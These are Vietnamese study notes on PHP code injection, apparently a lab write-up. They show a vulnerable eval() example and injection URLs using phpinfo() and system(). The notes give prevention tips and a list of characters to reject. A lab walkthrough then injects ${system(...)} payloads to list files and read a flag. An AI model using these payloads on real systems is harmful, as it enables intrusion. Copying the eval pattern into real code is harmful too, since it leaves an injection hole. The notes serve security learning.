I. Lý thuyết<br>
1. tiêm code là gì<br>
- là vul web app cho phép attacker tiêm code độc hại vào để thực thi hay xâm phạm hoàn toàn app và data của nó
- attacker chỉ bị giới hạn bởi chức năng của chính ngôn ngữ mà hắn chèn<br>

2. cách để test<br>
- cần phát hiện all vector input nơi user can nhập data
- VD:<br>
+ app lấy input từ user và in nó trên HTML page<br>
```
$name = $_GET['name’];
eval("echo  \$name;");
```
+ -> xài hàm: eval -> đánh giá chuỗi dưới dạng code PHP và ko lọc input của user
+ khi tiêm payload url sẽ có dạng: /index.php?name=1; phpinfo();
+ đoạn mã kết thúc bằng dấu ';' và hàm phpinfo(); sẽ hiển thị all in4 của PHP
+ -> sau khi thấy kết quả, can nâng cấp lên thành tiêm lệnh: /index.php?name=1; system(‘ls -la’);<br>

3. phòng tránh<br>
- xác thực và lọc all input từ user
- liệt kê các kí tự bị từ chối: |  ;  &  $  >  <  '  \   !   >>   #
- thoát all kí tự liên quan đến app system<br>

4. tool<br>
- https://portswigger.net/<br>

II. lap: Hashable<br>
1. tìm ra nơi can nhập input -> nhập thử code: ${system('pwd')} -> check web hoạt động -> /var/www/html<br>

![image](https://github.com/user-attachments/assets/03e0bbd1-437b-4e05-9b6f-2022b46e245c)<br>

2. tiêm code: ${system('ls -la')} -> flag_23894ABCX1.txt<br>

![image](https://github.com/user-attachments/assets/8473fe6a-bf11-48a2-98ed-fbe46b951ce5)<br>

3. đọc file: ${system('cat flag_23894ABCX1.txt')} -> 18ab51f960bd149bcb2497b9998c752c<br>

![image](https://github.com/user-attachments/assets/039e686b-4e75-4276-8d0a-b8c783582188)
